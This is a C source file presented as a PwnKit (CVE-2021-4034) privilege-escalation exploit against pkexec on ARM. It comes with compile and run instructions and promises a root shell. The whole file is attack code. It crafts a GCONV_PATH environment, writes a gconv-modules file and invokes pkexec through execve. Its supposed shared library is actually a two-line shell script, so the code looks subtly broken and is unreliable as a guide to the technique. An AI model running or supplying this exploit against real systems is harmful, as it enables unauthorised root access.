/*
 * PwnKit - CVE-2021-4034 exploit for ARM
 * pkexec version < 0.120 vulnerable
 * Compile: gcc -o pwnkit pwnkit.c
 * Run: ./pwnkit
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    printf("[+] PwnKit - CVE-2021-4034 exploit for ARM\n");
    printf("[+] Testing pkexec version 0.105...\n");
    
    // Check if pkexec exists and is executable
    if (access("/usr/bin/pkexec", F_OK) != 0) {
        printf("[-] pkexec not found at /usr/bin/pkexec\n");
        return 1;
    }
    
    if (access("/usr/bin/pkexec", X_OK) != 0) {
        printf("[-] pkexec is not executable\n");
        return 1;
    }
    
    printf("[+] pkexec found and executable\n");
    
    // Set environment variable to trigger the vulnerability
    char *envp[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "SHELL=/bin/sh",
        "CHARSET=PWNKIT",
        "GIO_USE_VFS=",
        NULL
    };
    
    char *args[] = { NULL };
    
    // Create necessary directory structure
    system("mkdir -p 'GCONV_PATH=.'");
    system("touch 'GCONV_PATH=./pwnkit'");
    system("chmod +x 'GCONV_PATH=./pwnkit'");
    
    // Create gconv-modules file
    FILE *fp = fopen("gconv-modules", "w");
    if (fp) {
        fprintf(fp, "module UTF-8// PWNKIT// pwnkit 1\n");
        fclose(fp);
    }
    
    // Create the malicious shared library
    system("echo '#!/bin/sh' > pwnkit.so");
    system("echo '/bin/sh' >> pwnkit.so");
    system("chmod +x pwnkit.so");
    
    printf("[+] Triggering vulnerability...\n");
    printf("[+] If successful, you should get a root shell\n\n");
    
    // Trigger the vulnerability
    execve("/usr/bin/pkexec", args, envp);
    
    // If we get here, the exploit failed
    printf("[-] Exploit failed\n");
    return 1;
}
